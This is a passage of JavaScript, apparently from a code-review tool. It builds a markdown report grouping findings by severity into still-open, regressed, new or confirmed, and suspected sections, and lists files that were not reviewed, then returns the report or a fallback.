    ...(isRereview && adjudicated.stillOpen.length ? [``, `## 🔴 Still open`, ...bySev(adjudicated.stillOpen).map(fmt)] : []),
    ...(isRereview && adjudicated.regressed.length ? [``, `## ⚠️ Regressed`, ...bySev(adjudicated.regressed).map(fmt)] : []),
    ``, `## ${isRereview ? '🆕 New' : 'Confirmed'}`, ...(confirmed.length ? bySev(confirmed).map(fmt) : ['- none']),
    ...(suspected.length ? [``, `## Suspected (needs confirmation)`, ...bySev(suspected).map(fmt)] : []),
    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map(f => `- ${f}`)] : []),
  ].join('\n')
}

return report || fallbackReport()
